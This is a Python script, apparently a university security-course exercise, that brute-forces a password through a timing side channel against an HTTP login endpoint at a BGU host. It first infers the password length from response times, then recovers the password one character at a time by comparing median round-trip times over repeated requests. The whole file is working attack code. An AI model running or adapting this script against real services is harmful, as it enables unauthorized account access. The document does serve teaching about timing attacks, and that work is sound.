import statistics
import string
import sys
import time
from operator import itemgetter

import requests

URL = "http://aoi.ise.bgu.ac.il"
ATTEMPTS_PER_LETTER = 5
MAX_PASSWORD_LEN = 32


class PasswordFound(Exception):

    def __init__(self, password):
        self.password = password


def eprint(*args, **kwargs):
    """
    Print to stderr
    """
    print(*args, file=sys.stderr, **kwargs)


def try_to_hack(username, password, difficulty):
    """
    This function sends ATTEMPTS_PER_LETTER times requests to the server
    :param username: the username
    :param password: the current guessed password
    :param difficulty: the difficulty level
    :return: list of all the RTTs took for each request
    """
    timings = []

    # Do #ATTEMPTS_PER_LETTER HTTP calls
    for _ in range(ATTEMPTS_PER_LETTER):
        before = time.perf_counter()
        result = requests.get(URL, params={'user': username, 'password': password, 'difficulty': difficulty})
        after = time.perf_counter()

        if result.content == b'1':
            raise PasswordFound(password)

        timings.append(after - before)

    return timings


def find_next_character(username, password, password_length, difficulty):
    measures = []

    eprint("Trying to find the character at position %s with prefix %r" % ((len(password) + 1), password))
    for _, character in enumerate(string.ascii_lowercase):
        timings = try_to_hack(username, password + character + "0" * (password_length - len(password) - 1), difficulty)

        median = statistics.median(timings)
        min_timing = min(timings)
        max_timing = max(timings)
        stddev = statistics.stdev(timings)

        eprint(f'searching: {password + character + "0" * (password_length - len(password) - 1)}',
              {'character': character, 'median': median, 'min': min_timing,
               'max': max_timing, 'stddev': stddev})

        measures.append({'character': character, 'median': median, 'min': min_timing,
                         'max': max_timing, 'stddev': stddev})

    sorted_measures = list(sorted(measures, key=itemgetter('median'), reverse=True))

    found_character = sorted_measures[0]
    top_characters = sorted_measures[1:4]

    eprint("Found character at position %s: %r" % ((len(password) + 1), found_character['character']))
    msg = "Median: %s Max: %s Min: %s Stddev: %s"
    eprint(msg % (found_character['median'], found_character['max'], found_character['min'], found_character['stddev']))

    eprint("\nFollowing characters were:")

    for top_character in top_characters:
        ratio = int((1 - (top_character['median'] / found_character['median'])) * 100)
        msg = "Character: %r Median: %s Max: %s Min: %s Stddev: %s (%d%% slower)"
        eprint(msg % (top_character['character'], top_character['median'], top_character['max'], top_character['min'],
                     top_character['stddev'], ratio))

    return found_character['character']


def assume_password_length():
    times_by_len = dict()

    for pass_length in range(1, MAX_PASSWORD_LEN + 1):
        characters = '0' * pass_length

        before = time.perf_counter()
        _ = requests.get(URL, params={'user': 'mosho', 'password': characters})
        after = time.perf_counter()

        times_by_len[pass_length] = after - before
        eprint(f'Checking length of {pass_length}: time: {times_by_len[pass_length]}')

    # Password length is set to the maximum response time from the server.
    # This 'max' function returns the key that has the maximum value.
    return max(times_by_len, key=times_by_len.get)


def main():
    # Do a first request to start the keep-alive connection
    requests.get(URL)

    if len(sys.argv) not in (2, 3):
        print('\n'.join(["Usage: python3 ex01_M1.py [username]",
                         "OR:    python3 ex01_M1.py [username] [difficulty]"]))
        sys.exit(1)

    start = time.time()
    while 1:
        username = sys.argv[1]
        difficulty = sys.argv[2] if len(sys.argv) == 3 else 1
        password = ''

        password_length = assume_password_length()
        eprint(f'The password assumed length: {password_length}\n')

        try:
            while len(password) != password_length:
                next_character = find_next_character(username, password, password_length, difficulty)
                password += next_character

        except PasswordFound as p:
            print(p.password)
            break

    end = time.time()
    eprint(f'Took: {end - start} seconds')


if __name__ == '__main__':
    main()
